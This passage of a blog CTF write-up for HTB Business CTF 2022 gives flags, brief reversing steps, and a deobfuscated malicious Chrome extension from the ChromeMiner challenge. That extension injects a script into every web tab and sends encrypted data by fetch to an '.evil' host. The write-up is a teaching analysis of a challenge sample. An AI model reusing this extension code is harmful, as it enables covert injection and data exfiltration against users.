+signature: 59b980d833bffec9b1fe51a5256e66cca1e56e92ade292148edbb9421b50ce877f8bb052bd6c0d011fc06b80db42425bc5ce757d393d63a99215088c03fb1623c7fc9efbfbefde2b86072b7f3e2f8d7bd9c32c1752c3360e8e578e447f7c9445da99a39365bebf80e7975c05db7a74e736359a334a52e55c60329a7584b666e756620775b88987b918bb3d278216686ed7e12dc6807aaaab4c70ba3802c31b925fccf3f52b0c890cd24d737416b7cbd7fab1da146b974be4905ddf18602f29dc5233110f1cb657853b5aa0c7bd65cbc3bf9244e92f1cb48d103c8e524eae0cc5c1b966a6ff23e21b226e0d24b298433c059935bdf5dfa8836864232b2b573b10
+
+...
+// for_BBGun06 revenge
+Enter the signature as hex: 0059b980d833bffec9b1fe51a5256e66cca1e56e92ade292148edbb9421b50ce877f8bb052bd6c0d011fc06b80db42425bc5ce757d393d63a99215088c03fb1623c7fc9efbfbefde2b86072b7f3e2f8d7bd9c32c1752c3360e8e578e447f7c9445da99a39365bebf80e7975c05db7a74e736359a334a52e55c60329a7584b666e756620775b88987b918bb3d278216686ed7e12dc6807aaaab4c70ba3802c31b925fccf3f52b0c890cd24d737416b7cbd7fab1da146b974be4905ddf18602f29dc5233110f1cb657853b5aa0c7bd65cbc3bf9244e92f1cb48d103c8e524eae0cc5c1b966a6ff23e21b226e0d24b298433c059935bdf5dfa8836864232b2b573b10
+HTB<span class="o">{</span>8131ch3n84ch32<span class="s1">'06_519n47u23_f02932y}
+</span></code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>signature: 866753b3e8009d9a365d11b9d334be86178de27f697d1f2e849222c557776f9befecee7c8adde061f226a2260b441e8df47a1c854be940a6b7d88029f32614121b72e10efd3b10609d66bff26c459da939c89e28117a5f1c761d3805cac6564b090323cdf8399e632c48d3db48e1a0c774d4f14fb673bb02385fc74cafc8b6d3ff0c2ac9247ba62ebd27fc798aa1ca29d88d2ce8fd79d3c01975964385806e85138a5175092cdac710aab71d000c2e77bb9f15cfbe82ff2a20416ea32ea388c1c5a3d6a8570f74a4eafbf4f46dda39167ad8a93aecc345f24d5e8134b260ce2c75405804ab546576b5492fbb76cad9da56939a3653d92f4320d4fddaa698864f
+
+...
+
+Enter the signature as hex: 00866753b3e8009d9a365d11b9d334be86178de27f697d1f2e849222c557776f9befecee7c8adde061f226a2260b441e8df47a1c854be940a6b7d88029f32614121b72e10efd3b10609d66bff26c459da939c89e28117a5f1c761d3805cac6564b090323cdf8399e632c48d3db48e1a0c774d4f14fb673bb02385fc74cafc8b6d3ff0c2ac9247ba62ebd27fc798aa1ca29d88d2ce8fd79d3c01975964385806e85138a5175092cdac710aab71d000c2e77bb9f15cfbe82ff2a20416ea32ea388c1c5a3d6a8570f74a4eafbf4f46dda39167ad8a93aecc345f24d5e8134b260ce2c75405804ab546576b5492fbb76cad9da56939a3653d92f4320d4fddaa698864f
+HTB<span class="o">{</span>1t_w@s_5upp0s3d_to_b3_8131ch3n84ch32<span class="s1">'s}
+</span></code></pre></div></div>
+
+<hr />
+
+<h2 id="crypto--elelgamal">CRYPTO : ElElGamal</h2>
+<p>I didn’t know about ElGamal in cryptography, so I searched a lot.  <br />
+writing…<br />
+—</p>
+
+<h2 id="rev--breakout">REV : BreakOut</h2>
+
+<h3 id="1-flag-recovering">1. FLAG Recovering</h3>
+<ol>
+  <li>Connect <code class="language-plaintext highlighter-rouge">URL:port/proc/self/maps</code> and see what prob should be the base program. <code class="language-plaintext highlighter-rouge">/bkd</code> is running!</li>
+  <li>Download <code class="language-plaintext highlighter-rouge">bkd</code> file in website.</li>
+  <li>Realize it’s web server made by C++.</li>
+  <li>Find <code class="language-plaintext highlighter-rouge">secretGet</code> function and get flag.</li>
+</ol>
+
+<h3 id="2-get-flag">2. Get FLAG</h3>
+<p><img src="/assets/img/legacy/2022-htb_businessctf/3.png" alt="3.png" /></p>
+
+<p>Flag is <code class="language-plaintext highlighter-rouge">HTB{th3_pr0c_f5_15_4_p53ud0_f1l35y5t3m_wh1ch_pr0v1d35_4n_1nt3rf4c3.....}</code>.</p>
+
+<hr />
+
+<h2 id="rev--chromeminer">REV : ChromeMiner</h2>
+
+<p>Fully obfuscated js Challenge.</p>
+
+<h3 id="1-recover-with-hand">1. Recover with hand</h3>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">async</span> <span class="kd">function</span> <span class="nf">iF</span><span class="p">()</span> <span class="p">{</span>
+  <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="dl">'</span><span class="s1">injected</span><span class="dl">'</span> <span class="k">in</span> <span class="nb">document</span><span class="p">))</span> <span class="p">{</span>
+    <span class="nb">document</span><span class="p">[</span><span class="dl">'</span><span class="s1">injected</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+    <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">setInterval</span><span class="dl">'</span><span class="p">](</span><span class="k">async </span><span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+      <span class="nx">y</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Uint8Array</span><span class="dl">'</span><span class="p">](</span><span class="mi">64</span><span class="p">);</span>
+      <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">crypto</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">getRandomValues</span><span class="dl">'</span><span class="p">](</span><span class="nx">y</span><span class="p">);</span>
+      <span class="k">if </span><span class="p">(</span><span class="k">new</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">TextDecoder</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">utf-8</span><span class="dl">'</span><span class="p">)[</span><span class="dl">'</span><span class="s1">decode</span><span class="dl">'</span><span class="p">](</span><span class="k">await</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">crypto</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">subtle</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">digest</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">sha-256</span><span class="dl">'</span><span class="p">,</span> <span class="nx">y</span><span class="p">))[</span><span class="dl">'</span><span class="s1">endsWith</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">chrome</span><span class="dl">'</span><span class="p">))</span> <span class="p">{</span>
+        <span class="nx">j</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Uint8Array</span><span class="dl">'</span><span class="p">](</span><span class="nx">y</span><span class="p">[</span><span class="dl">'</span><span class="s1">byteLength</span><span class="dl">'</span><span class="p">]</span> <span class="o">+</span> <span class="p">(</span><span class="k">await</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">crypto</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">subtle</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">digest</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">sha-256</span><span class="dl">'</span><span class="p">,</span> <span class="nx">y</span><span class="p">))[</span><span class="dl">'</span><span class="s1">byteLength</span><span class="dl">'</span><span class="p">]);</span>
+        <span class="nx">j</span><span class="p">[</span><span class="dl">'</span><span class="s1">set</span><span class="dl">'</span><span class="p">](</span><span class="k">new</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Uint8Array</span><span class="dl">'</span><span class="p">](</span><span class="nx">y</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
+        <span class="nx">j</span><span class="p">[</span><span class="dl">'</span><span class="s1">set</span><span class="dl">'</span><span class="p">](</span><span class="k">new</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Uint8Array</span><span class="dl">'</span><span class="p">](</span><span class="k">await</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">crypto</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">subtle</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">digest</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">sha-256</span><span class="dl">'</span><span class="p">,</span> <span class="nx">y</span><span class="p">)),</span> <span class="nx">y</span><span class="p">[</span><span class="dl">'</span><span class="s1">byteLength</span><span class="dl">'</span><span class="p">]);</span>
+        <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">fetch</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">hxxps://qwertzuiop123.evil/</span><span class="dl">'</span> <span class="o">+</span> 
+        <span class="p">[...</span><span class="k">new</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Uint8Array</span><span class="dl">'</span><span class="p">](</span><span class="k">await</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">crypto</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">subtle</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">encrypt</span><span class="dl">'</span><span class="p">]({[</span><span class="dl">'</span><span class="s1">name</span><span class="dl">'</span><span class="p">]:</span> <span class="dl">'</span><span class="s1">AES-CBC</span><span class="dl">'</span><span class="p">,</span> <span class="p">[</span><span class="dl">'</span><span class="s1">iv</span><span class="dl">'</span><span class="p">]:</span> <span class="k">new</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">TextEncoder</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">utf-8</span><span class="dl">'</span><span class="p">)[</span><span class="dl">'</span><span class="s1">encode</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">_NOT_THE_SECRET_</span><span class="dl">'</span><span class="p">)},</span> <span class="k">await</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">crypto</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">subtle</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">importKey</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">raw</span><span class="dl">'</span><span class="p">,</span> <span class="k">await</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">crypto</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">subtle</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">decrypt</span><span class="dl">'</span><span class="p">]({[</span><span class="dl">'</span><span class="s1">name</span><span class="dl">'</span><span class="p">]:</span> <span class="dl">'</span><span class="s1">AES-CBC</span><span class="dl">'</span><span class="p">,</span> <span class="p">[</span><span class="dl">'</span><span class="s1">iv</span><span class="dl">'</span><span class="p">]:</span> <span class="k">new</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">TextEncoder</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">utf-8</span><span class="dl">'</span><span class="p">)[</span><span class="dl">'</span><span class="s1">encode</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">_NOT_THE_SECRET_</span><span class="dl">'</span><span class="p">)},</span> <span class="k">await</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">crypto</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">subtle</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">importKey</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">raw</span><span class="dl">'</span><span class="p">,</span> <span class="k">new</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">TextEncoder</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">utf-8</span><span class="dl">'</span><span class="p">)[</span><span class="dl">'</span><span class="s1">encode</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">_NOT_THE_SECRET_</span><span class="dl">'</span><span class="p">),</span> <span class="p">{[</span><span class="dl">'</span><span class="s1">name</span><span class="dl">'</span><span class="p">]:</span> <span class="dl">'</span><span class="s1">AES-CBC</span><span class="dl">'</span><span class="p">},</span> <span class="kc">true</span><span class="p">,</span> <span class="p">[</span><span class="dl">'</span><span class="s1">decrypt</span><span class="dl">'</span><span class="p">]),</span> <span class="k">new</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Uint8Array</span><span class="dl">'</span><span class="p">]((</span><span class="dl">'</span><span class="s1">E242E64261D21969F65BEDF954900A995209099FB6C3C682C0D9C4B275B1C212BC188E0882B6BE72C749211241187FA8</span><span class="dl">'</span><span class="p">)[</span><span class="dl">'</span><span class="s1">match</span><span class="dl">'</span><span class="p">](</span><span class="sr">/../g</span><span class="p">)[</span><span class="dl">'</span><span class="s1">map</span><span class="dl">'</span><span class="p">](</span><span class="nx">h</span> <span class="o">=&gt;</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">parseInt</span><span class="dl">'</span><span class="p">](</span><span class="nx">h</span><span class="p">,</span> <span class="mi">16</span><span class="p">)))),</span> <span class="p">{[</span><span class="dl">'</span><span class="s1">name</span><span class="dl">'</span><span class="p">]:</span> <span class="dl">'</span><span class="s1">AES-CBC</span><span class="dl">'</span><span class="p">},</span> <span class="kc">true</span><span class="p">,</span> <span class="p">[</span><span class="dl">'</span><span class="s1">encrypt</span><span class="dl">'</span><span class="p">]),</span> <span class="nx">j</span><span class="p">))][</span><span class="dl">'</span><span class="s1">map</span><span class="dl">'</span><span class="p">](</span><span class="nx">x</span> <span class="o">=&gt;</span> <span class="nx">x</span><span class="p">[</span><span class="dl">'</span><span class="s1">toString</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">)[</span><span class="dl">'</span><span class="s1">padStart</span><span class="dl">'</span><span class="p">](</span><span class="mi">2</span><span class="p">,</span> <span class="dl">"</span><span class="s2">0</span><span class="dl">"</span><span class="p">))[</span><span class="dl">'</span><span class="s1">join</span><span class="dl">'</span><span class="p">](</span><span class="dl">""</span><span class="p">));</span>
+      <span class="p">}</span>
+    <span class="p">},</span> <span class="mi">1</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+<span class="p">;</span>
+
+<span class="nx">chrome</span><span class="p">[</span><span class="dl">'</span><span class="s1">tabs</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">onUpdated</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">addListener</span><span class="dl">'</span><span class="p">]((</span><span class="nx">tabVar</span><span class="p">,</span> <span class="nx">changeInfo</span><span class="p">,</span> <span class="nx">tab</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+  <span class="k">if </span><span class="p">(</span><span class="dl">'</span><span class="s1">url</span><span class="dl">'</span> <span class="k">in</span> <span class="nx">tab</span> <span class="o">&amp;&amp;</span> <span class="nx">tab</span><span class="p">[</span><span class="dl">'</span><span class="s1">url</span><span class="dl">'</span><span class="p">]</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">tab</span><span class="p">[</span><span class="dl">'</span><span class="s1">url</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">startsWith</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">https://</span><span class="dl">'</span><span class="p">)</span> <span class="o">||</span> <span class="nx">tab</span><span class="p">[</span><span class="dl">'</span><span class="s1">url</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">startsWith</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">http://</span><span class="dl">'</span><span class="p">)))</span> <span class="p">{</span>
+    <span class="nx">chrome</span><span class="p">[</span><span class="dl">'</span><span class="s1">scripting</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">executeScript</span><span class="dl">'</span><span class="p">]({[</span><span class="dl">'</span><span class="s1">target</span><span class="dl">'</span><span class="p">]:</span> <span class="p">{[</span><span class="dl">'</span><span class="s1">tabId</span><span class="dl">'</span><span class="p">]:</span> <span class="nx">tab</span><span class="p">[</span><span class="dl">'</span><span class="s1">id</span><span class="dl">'</span><span class="p">]},</span> <span class="na">function</span><span class="p">:</span> <span class="nx">iF</span><span class="p">});</span>
+  <span class="p">}</span>
+<span class="p">});</span>
+</code></pre></div></div>
+
+<h3 id="2-decrypt-with-aes-256">2. Decrypt with AES-256</h3>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="kn">from</span> <span class="n">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">AES</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">_NOT_THE_SECRET_</span><span class="sh">'</span><span class="p">,</span><span class="n">AES</span><span class="p">.</span><span class="n">MODE_CBC</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="s">_NOT_THE_SECRET_</span><span class="sh">'</span><span class="p">)</span>
+<span class="o">&lt;</span><span class="n">Crypto</span><span class="p">.</span><span class="n">Cipher</span><span class="p">.</span><span class="n">AES</span><span class="p">.</span><span class="n">AESCipher</span> <span class="nb">object</span> <span class="n">at</span> <span class="mh">0x7fae19feb790</span><span class="o">&gt;</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">_NOT_THE_SECRET_</span><span class="sh">'</span><span class="p">,</span><span class="n">AES</span><span class="p">.</span><span class="n">MODE_CBC</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="s">_NOT_THE_SECRET_</span><span class="sh">'</span><span class="p">)</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">cipher</span><span class="p">.</span><span class="nf">decrypt</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\xe2</span><span class="s">B</span><span class="se">\xe6</span><span class="s">Ba</span><span class="se">\xd2\x19</span><span class="s">i</span><span class="se">\xf6</span><span class="s">[</span><span class="se">\xed\xf9</span><span class="s">T</span><span class="se">\x90\n\x99</span><span class="s">R</span><span class="se">\t\t\x9f\xb6\xc3\xc6\x82\xc0\xd9\xc4\xb2</span><span class="s">u</span><span class="se">\xb1\xc2\x12\xbc\x18\x8e\x08\x82\xb6\xbe</span><span class="s">r</span><span class="se">\xc7</span><span class="s">I!</span><span class="se">\x12</span><span class="s">A</span><span class="se">\x18\x7f\xa8</span><span class="sh">'</span><span class="p">)</span>
+<span class="sa">b</span><span class="sh">'</span><span class="s">HTB{__mY_vRy_owN_CHR0me_M1N3R__}</span><span class="se">\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10</span><span class="sh">'</span>
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="for--linas-invitation">FOR : Lina’s Invitation</h2>
+<p>writing….</p>
+
+    </div>
+    
+      <aside class="toc-shell js-toc-shell" aria-label="Table of contents">
+        <button class="toc-toggle" type="button" aria-expanded="false" aria-controls="toc-list">On this page</button>
+        <nav id="toc-list" class="js-toc"></nav>
+      </aside>
+    
+  </div>
+
+  
+
+  
+
+
+
+<section class="related-posts">
+  <h2>Related</h2>
+  <div class="card-grid">
+    
+      <article class="post-card">
+  <h3><a href="/research/2022/07/18/htb_businessctf_2022/">HTB Business CTF 2022 : Dirty Money write-up (in progress)</a></h3>
+  <p>CTF writeup covering challenge analysis, exploit/reversing flow, and key takeaways.</p>
+  <p class="meta">2022-07-18</p>
+  
+    <ul class="chip-list">
+      
+        <li><a href="/tags/#tag-research">#research</a></li>
+      
+        <li><a href="/tags/#tag-ctf">#ctf</a></li>
+      
+        <li><a href="/tags/#tag-writeup">#writeup</a></li>
+      
+    </ul>
+  
+</article>
+
+    
+      <article class="post-card">
+  <h3><a href="/research/2021/07/13/redpwn_2021_rev_web/">2021 redpwnCTF write-up</a></h3>
+  <p>CTF writeup covering challenge analysis, exploit/reversing flow, and key takeaways.</p>
+  <p class="meta">2021-07-13</p>
+  
+    <ul class="chip-list">
+      
+        <li><a href="/tags/#tag-research">#research</a></li>
+      
+        <li><a href="/tags/#tag-ctf">#ctf</a></li>
+      
+        <li><a href="/tags/#tag-writeup">#writeup</a></li>
+      
+        <li><a href="/tags/#tag-web">#web</a></li>
+      
+    </ul>
+  
+</article>
+
+    
+      <article class="post-card">
+  <h3><a href="/research/2021/06/14/thcctf_2021_pwn_rev/">2021 thcctf write-up</a></h3>
+  <p>CTF writeup covering challenge analysis, exploit/reversing flow, and key takeaways.</p>
+  <p class="meta">2021-06-14</p>
+  
+    <ul class="chip-list">
+      
+        <li><a href="/tags/#tag-research">#research</a></li>
+      
+        <li><a href="/tags/#tag-ctf">#ctf</a></li>
+      
+        <li><a href="/tags/#tag-writeup">#writeup</a></li>
+      
+    </ul>
+  
+</article>
+
+    
+  </div>
+</section>
+
+
+
+  
+  
+</article>
+
+    </main>
+    <footer class="site-footer">
+  <div class="shell footer-shell">
+    <p>be the special st4rlight in the world</p>
+    <ul class="footer-links">
+      
+        
+        
+        
+          <li><a href="https://github.com/st4rlight">GitHub</a></li>
+        
+      
+        
+        
+        
+          <li><a href="mailto:bww9643@gmail.com">Email</a></li>
+        
+      
+        
+        
+        
+          <li><a href="https://ainsetin.notion.site/Ainsetin-s-Write-up-c1a0fb95760b41508d54ce94dc3601c5">Notion</a></li>
+        
+      
+    </ul>
+  </div>
+</footer>
+
+
+    
+      <script src="https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.min.js" defer></script>
+    
+    
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.10/dist/katex.min.css">
+      <script src="https://cdn.jsdelivr.net/npm/katex@0.16.10/dist/katex.min.js" defer></script>
+      <script src="https://cdn.jsdelivr.net/npm/katex@0.16.10/dist/contrib/auto-render.min.js" defer></script>
+    
+    <script src="https://cdn.jsdelivr.net/npm/highlight.js@11.11.1/lib/common.min.js" defer></script>
+    <script src="/assets/js/main.js" defer></script>
+  </body>
+</html>
